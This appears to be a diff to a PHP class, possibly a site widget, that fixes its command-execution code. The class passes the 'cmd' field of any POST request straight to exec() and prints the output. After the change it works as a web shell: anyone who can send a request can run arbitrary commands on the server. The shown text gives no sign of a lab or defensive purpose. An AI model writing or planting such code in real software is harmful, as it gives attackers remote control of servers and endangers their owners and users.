@@ -10,14 +10,21 @@
 		public function execute($cmd)
 		{
 			exec($cmd, $res);
-			echo $res;
+			foreach ($res as $line)
+			{
+				echo $line . "\n";
+			}
 		}
 		
 		public function manage_post($post)
-		{
+		{	
 			if (isset($_POST['cmd'])) {
-				$widget->execute($_POST['cmd']);
+				$this->execute($_POST['cmd']);
+				
+				return 1;
 			}
+			
+			return 0;
 		}
 	}
 ?>
